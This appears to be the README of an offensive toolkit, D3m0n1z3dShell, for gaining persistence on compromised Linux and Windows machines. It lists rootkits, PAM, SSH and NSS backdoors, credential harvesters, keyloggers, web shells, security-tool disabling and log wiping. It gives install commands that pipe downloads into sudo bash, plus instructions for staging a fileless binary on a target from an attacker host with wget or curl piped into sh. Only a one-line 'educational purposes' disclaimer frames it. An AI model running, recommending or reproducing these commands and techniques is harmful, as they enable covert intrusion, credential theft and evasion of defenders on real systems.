<h1 align="center">「😈」About D3m0n1z3dShell </h1>

<p align="center"><img src="carbon.png"></p>

Demonized Shell is an Advanced Tool for persistence in linux.

> 📖 **[Full Technical Documentation with Flowcharts →](DOCS.md)** — Detailed Mermaid diagrams for all 102 techniques

### Install

```
git clone https://github.com/Anu-Ansaf/D3m0n1z3dShell.git
cd D3m0n1z3dShell
chmod +x demonizedshell.sh
sudo ./demonizedshell.sh
```

### One-Liner Install

Download D3m0n1z3dShell with all files:
```
curl -L https://github.com/MatheuZSecurity/D3m0n1z3dShell/archive/main.tar.gz | tar xz && cd D3m0n1z3dShell-main && sudo ./demonizedshell.sh
```

Load D3m0n1z3dShell statically (without the static-binaries directory):
```
sudo curl -s https://raw.githubusercontent.com/MatheuZSecurity/D3m0n1z3dShell/main/static/demonizedshell_static.sh -o /tmp/demonizedshell_static.sh && sudo bash /tmp/demonizedshell_static.sh
```

### Demonized Features

* Auto Generate SSH keypair for all users
* APT Persistence 
* Crontab Persistence
* Systemd User level
* Systemd Root Level
* Bashrc Persistence
* Privileged user & SUID bash
* LKM Rootkit Modified, Bypassing rkhunter.
* LKM Rootkit With file encoder. persistent icmp backdoor and others features.
* ICMP Backdoor 
* LD_PRELOAD Setup PrivEsc
* Static Binaries For Process Monitoring, Dump credentials, Enumeration, Trolling and Others Binaries.
* Process Injection (ptrace-based)
* One-Liner Install (curl | bash)
* Static D3m0n1z3dShell
* ELF/Rootkit Anti-Reversing Technique
* rc.local Persistence
* Init.d Persistence
* MOTD Persistence
* Persistence via ACL
* Reverse shell with a process name of your choice
* Udev Persistence (Net/USB/Block/Custom triggers)
* LKM Rootkit Persistence After Reboot (6-layer persistence)
* PAM Backdoor
* SSH Authorized Keys Backdoor
* Logrotate Persistence
* Git Hooks Persistence
* XDG Autostart Persistence
* At Job Persistence
* DKMS Integration for LKM Rootkit (auto-recompile on kernel update)
* Process Hiding via Bind Mount (mount --bind /proc overlay)
* Hidepid /proc Mount (hide processes from non-root users)
* Initramfs Injection (ultra-persistent, loads before root FS)
* Package Manager Backdoor (.deb with postinst rootkit loader)
* Depmod Stealth (hide module from modules.dep inspection)
* Namespace Jail (container-based rootkit — trap users in isolated namespaces)
* SSH Tunnel Hijack & Multiplexing Abuse (ControlMaster hijack, reverse tunnels, ProxyCommand injection)
* SSH-IT: PTY MITM Dual-Connection Stealth (THC-inspired ssh client replacement, dual SSH binding, credential capture, worm propagation)
* Trap Command Persistence — T1546.005 (DEBUG/EXIT/ERR/RETURN traps, preset revshell & keylogger)
* Python Startup Hooks — T1546.018 (.pth injection, usercustomize.py, sitecustomize.py, stealth revshell)
* Port Knocking / Socket Filter — T1205.002 (iptables knock sequences, single-packet auth, ICMP knock)
* Binary Trojanization — T1554 (replace ls/ps/netstat/ss/find/lsof/who/w/last with filtering wrappers)
* System-Wide ld.so.preload — T1574.006 (compiled .so hooking readdir, injected via /etc/ld.so.preload)
* Systemd Timer Persistence — T1053.006 (persistent systemd timer units with configurable intervals)
* Impair Defenses — T1562 (disable SELinux, AppArmor, auditd, history, firewall, syslog, EDR agents)
* Anti-Forensics / Indicator Removal — T1070 (timestomp, log wipe, history destroy, secure delete, trace cleanup)
* Rogue Certificate Authority — T1553.004 (generate & install rogue CA, issue leaf certs for domains)
* Hidden Encrypted Filesystem — T1564.005 (LUKS encrypted loopback, systemd auto-mount, emergency wipe)
* Bootkit / Bootloader Persistence — T1542.003 (GRUB2 injection, hidden menu entries, kernel params, EFI backdoor)
* Credential Harvester — T1552 (shadow dump, SSH keys, history passwords, /proc/environ, config creds, DB creds, process memory)
* Linux Keylogger — T1056.001 (TTY capture, X11 xinput, PAM credential logging, strace stdin, systemd daemon)
* Web Shell Deployment — T1505.003 (PHP variants, Python WSGI/CGI, Perl CGI, JSP for Tomcat, auto-detect web roots)
* Phantom User Creation — T1136.001 (UID-0 clone, nologin service account, invisible user with utmp/wtmp cleanup)
* Linux Capabilities Abuse — T1548 (cap_setuid, cap_dac_read_search, cap_net_raw, cap_sys_admin, capability scanner)
* PATH Variable Hijacking — T1574.007 (trojaned sudo/su/ssh/passwd, credential capture, /etc/profile.d injection)
* Fileless / Memfd Execution — T1027.011 (memfd_create+fexecve, /dev/shm staging, /proc/self/fd, heredoc pipe, curl-to-memory)
* VM / Sandbox Evasion — T1497 (hypervisor DMI/CPUID/MAC, container Docker/LXC/K8s, debugger ptrace, monitoring tools, hardware anomalies)
* xattr Data Hiding — T1564.001 (store payloads in extended attributes, retrieve, execute, bulk-hide across files)
* D-Bus Service Persistence — T1543.002 (system/session D-Bus activated services, on-demand IPC backdoor trigger)
* NSS Module Backdoor — T1556 (compiled libnss_d3m0n.so.2, invisible user via nsswitch.conf, below-PAM authentication)
* Library RPATH/ldconfig Poisoning — T1574.008 (RPATH exploitation, ldconfig cache injection, LD_AUDIT dynamic linker hook)
* DNS Tunneling C2 — T1071.004 (DNS TXT exfiltration, subdomain encoding, DNS C2 poll loop, iodine tunnel)
* Kernel Parameter Abuse — T1546 (core_pattern pipe exploit, sysctl.conf persistence, modprobe path hijack)

### Advanced Techniques (from Research)

* Diamorphine Rootkit Auto-Deploy — T1014 (auto git-clone, make, insmod; signal-based: kill -31 hide, kill -63 root, kill -64 toggle)
* Systemd Generator Persistence — T1543.002 (malicious generator in /lib/systemd/system-generators, creates .service units BEFORE any service at boot)
* NetworkManager Dispatcher Persistence — T1546 (scripts in /etc/NetworkManager/dispatcher.d/, triggers on network events up/down/dhcp)
* Polkit Privilege Escalation Backdoor — T1548 (permissive polkit JS rules or .pkla files for passwordless pkexec)
* Sudoers Backdoor — T1548.003 (NOPASSWD entries in /etc/sudoers.d/, syntax-validated with visudo -c)
* eBPF-Based Process/File Hiding — T1564 (eBPF getdents64 hooks, ebpfkit/TripleCross deployment, bcc-tools)
* Modprobe.d Event Hijacking — T1547.006 (/etc/modprobe.d/ install directives, payload on module autoload)
* GRUB Bootloader Backdoor — T1542 (hidden GRUB entries, kernel cmdline modification, disable security modules)
* Mount Namespace Stashspace — T1564.001 (isolated tmpfs in mount namespace, fileless process masquerading, anti-forensic shell, works unprivileged)

### Metasploit-Sourced Techniques

* SystemD Drop-in Override — T1543.002 (ExecStartPost drop-in on existing service, piggybacks ssh/cron, daemon-reload activated)
* Yum/DNF Plugin Backdoor — T1546 (inject os.system() into existing Yum plugins like fastestmirror.py, fires on every yum/dnf run)
* Docker Container Persistence — T1610 (privileged Alpine container, --restart=always, host mount, persistent image via docker commit)
* OpenRC Service Persistence — T1543 (openrc-run script, command_background, rc-update add, for Alpine/Gentoo systems)
* Upstart Service Persistence — T1543 (Upstart .conf job, respawn, runlevel triggers, for legacy Ubuntu/CentOS 6)
* Emacs Extension Persistence — T1546 (malicious .el package in ~/.emacs.d/lisp/, start-process in Elisp, auto-loaded via init.el)
* IGEL OS Persistence — T1546 (/license partition payload, setparam registry key injection, base64 encoded execution)
* WSL Startup Folder Persistence — T1546 (Windows Startup folder VBS/BAT launcher, scheduled task via schtasks, cross-subsystem persistence)
* Periodic/Anacron Script Persistence — T1053 (BSD periodic, anacron, cron.daily fallback, auto-detects system type)

### Windows Techniques (PowerShell Payload Generators)

**Persistence (8 techniques):**
* Registry Run Keys — T1547.001 (HKCU/HKLM/RunOnce, reverse shell payloads)
* Scheduled Task — T1053.005 (logon/daily/idle/startup triggers, SYSTEM context)
* Windows Service — T1543.003 (legit-sounding names, auto-restart recovery)
* WMI Event Subscription — T1546.003 (fileless 3-part Filter+Consumer+Binding)
* COM Object Hijacking — T1546.015 (ScriptletURL, InprocServer32, LocalServer32)
* BITS Job Persistence — T1197 (SetNotifyCmdLine, survives reboots)
* Startup Folder — T1547.001 (.lnk shortcut creation via COM)
* DLL Search Order Hijacking — T1574.001 (Teams/OneDrive/Slack targets)

**Defense Evasion (7 techniques):**
* AMSI Bypass — T1562.001 (reflection, AmsiScanBuffer patch, obfuscated variants)
* Disable Windows Defender — T1562.001 (MpPreference, registry, exclusion paths)
* ETW Patching — T1562.006 (EtwEventWrite → ret, blinds .NET telemetry)
* Event Log Clearing — T1070.001 (wevtutil, selective/all, disable service)
* LOLBin Proxy Execution — T1218 (mshta, rundll32, regsvr32 Squiblydoo, certutil, msiexec)
* Timestomping — T1070.006 (copy from legit file, specific date, randomize)
* Parent PID Spoofing — T1134.004 (STARTUPINFOEX + P/Invoke CreateProcess)

**Credential Access (5 techniques):**
* LSASS Memory Dump — T1003.001 (comsvcs.dll, P/Invoke MiniDumpWriteDump)
* SAM/SYSTEM/SECURITY Extraction — T1003.002 (reg save, Volume Shadow Copy)
* Kerberoasting — T1558.003 (TGS ticket request, hashcat/john format output)
* DPAPI Secret Extraction — T1555.004 (Chrome/Edge passwords, Credential Manager)
* WiFi Password Extraction — T1552.001 (netsh wlan profiles, XML export)

**Stealth & Indicator Removal (4 techniques):**
* Alternate Data Streams — T1564.004 (hide in file/directory ADS, execute from ADS)
* Hidden Files & Directories — T1564.001 (Super-hidden attributes, lock Explorer settings)
* Process Name Masquerading — T1036.005 (trusted path mimic, legitimate process names)
* Secure Deletion & Indicator Removal — T1070.004 (multi-pass wipe, forensic artifact cleanup)

## Building Binary Versions

D3m0n1z3dShell can be compiled into standalone executables for targets where bash or script execution is restricted.

### Quick Start

```bash
chmod +x build.sh
./build.sh              # Build static ELF binary (recommended)
./build.sh all          # Build all three variants
./build.sh clean        # Remove build artifacts
```

### Build Modes

| Mode | Command | Target Requirements | Output | Best For |
|------|---------|-------------------|--------|----------|
| **Static ELF** | `./build.sh static` | **None** (zero deps) | `build/d3m0nized` | Hardened/minimal systems |
| **Self-Extracting** | `./build.sh sfx` | `/bin/sh` + `tar` | `build/d3m0nized-sfx` | Full toolkit with all tools |
| **shc Compiled** | `./build.sh shc` | `bash` | `build/d3m0nized-shc` | Quick obfuscated binary |

### Build Requirements (on Kali / Debian)

```bash
sudo apt install build-essential bash-static   # For static & sfx modes
sudo apt install shc                           # For shc mode only
```

### How the Static Binary Works

1. `objcopy` embeds a static bash interpreter and the complete script as ELF data sections
2. A C loader extracts them into anonymous memory file descriptors (`memfd_create`, kernel 3.17+)
3. `fork()` + `execve(/proc/self/fd/N)` runs bash from memory with the script from memory
4. **No files touch the filesystem** — fully fileless execution
5. Falls back to unlinked temp files in `/dev/shm` on older kernels

### Transfer to Target

```bash
# SCP
scp build/d3m0nized user@target:/tmp/
ssh user@target "chmod +x /tmp/d3m0nized && /tmp/d3m0nized"

# HTTP server
python3 -m http.server 8080 --directory build/
# On target:
wget http://KALI:8080/d3m0nized -O /tmp/d3m0nized && chmod +x /tmp/d3m0nized && /tmp/d3m0nized

# Fileless via curl pipe (sfx mode)
curl -sL http://KALI:8080/d3m0nized-sfx | sh
```

### Architecture Support

The build system auto-detects the host architecture. Supported:
- `x86_64` (amd64)
- `aarch64` (arm64)
- `i686` / `i386` (x86 32-bit)
- `armv7l` (ARM 32-bit)

To cross-compile, set `CC` to your cross-compiler and provide a static bash for the target arch.

### Pending Features

And other types of features that will come in the future.

## Contribution

If you want to contribute and help with the tool, please contact me on twitter: @MatheuzSecurity

## Note

> We are not responsible for any damage caused by this tool, use the tool intelligently and for educational purposes only.
